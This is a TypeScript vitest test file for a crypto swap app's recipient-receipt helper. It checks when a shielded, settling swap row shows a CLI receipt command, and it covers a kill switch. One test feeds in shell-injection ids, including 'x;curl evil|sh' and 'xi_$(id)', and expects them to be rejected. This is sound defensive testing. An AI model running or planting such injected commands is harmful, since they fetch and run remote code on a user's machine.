import { describe, it, expect } from "vitest";
import {
  AWAITING_RECIPIENT_SUBSTATUS,
  isAwaitingRecipient,
  receiptCommand,
} from "./recipientReceipt.js";
import { RECIPIENT_RECEIPTS_LIVE } from "../config.js";
import type { SwapActivityItem } from "../types/activity.js";
import type { IntentStatus } from "../types/intent.js";

const ID = "xi_shielded_receipt";

const row = (
  over: { id?: string; intentStatus?: IntentStatus } & Partial<SwapActivityItem["data"]> = {},
): SwapActivityItem => {
  const { id = ID, intentStatus = "settling", ...data } = over;
  return {
    id,
    type: "swap",
    timestamp: 0,
    status: "pending",
    intentStatus,
    data: {
      fromChainId: 8453,
      toChainId: 1,
      fromToken: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
      toToken: `0x${"ab".repeat(32)}`,
      fromAmount: "5000000",
      toAmount: "4989000",
      tier: "Standard",
      feeRate: 0.22,
      txHash: null,
      isCrossChain: true,
      substatus: AWAITING_RECIPIENT_SUBSTATUS,
      settlementType: "shielded",
      ...data,
    },
  };
};

describe("isAwaitingRecipient", () => {
  it("is a settling row carrying the Worker's marker, and nothing else", () => {
    expect(isAwaitingRecipient("settling", "awaiting_recipient")).toBe(true);
    expect(isAwaitingRecipient("settling", null)).toBe(false);
    expect(isAwaitingRecipient("settling", "filled")).toBe(false);
    // The marker outlives completion in the sticky merges; the status decides.
    expect(isAwaitingRecipient("completed", "awaiting_recipient")).toBe(false);
    expect(isAwaitingRecipient("failed", "awaiting_recipient")).toBe(false);
  });
});

describe("receiptCommand", () => {
  it("is the CLI's receipt invocation for a live, shielded, awaiting row", () => {
    expect(receiptCommand(row(), true)).toBe(`xochi-recipient receipt ${ID}`);
    // A local capture may not know the mode; only a known non-shielded one refuses.
    expect(receiptCommand(row({ settlementType: undefined }), true)).toBe(
      `xochi-recipient receipt ${ID}`,
    );
  });

  // Kill switch: the receipt endpoints 404 until the Worker flag flips, so the
  // command never shows ahead of them.
  it("shows nothing while receipts are not live", () => {
    expect(receiptCommand(row(), false)).toBeNull();
  });

  it("follows the client flag", () => {
    expect(receiptCommand(row(), RECIPIENT_RECEIPTS_LIVE) !== null).toBe(RECIPIENT_RECEIPTS_LIVE);
  });

  it("shows nothing once the row leaves settling", () => {
    for (const intentStatus of ["completed", "failed", "refunded"] as const) {
      expect(receiptCommand(row({ intentStatus }), true)).toBeNull();
    }
  });

  it("shows nothing without the marker or on a non-shielded row", () => {
    expect(receiptCommand(row({ substatus: null }), true)).toBeNull();
    expect(receiptCommand(row({ settlementType: "public" }), true)).toBeNull();
    expect(receiptCommand(row({ settlementType: "stealth" }), true)).toBeNull();
  });

  // The command is pasted into a shell on another machine, so the id must be
  // one the CLI itself accepts before it is ever shown.
  it("shows nothing for an id outside the CLI's pattern", () => {
    for (const id of ["x;curl evil|sh", "xi 1", "", "a".repeat(129), "xi_$(id)"]) {
      expect(receiptCommand(row({ id }), true)).toBeNull();
    }
    expect(receiptCommand(row({ id: "a".repeat(128) }), true)).toBe(
      `xochi-recipient receipt ${"a".repeat(128)}`,
    );
  });
});
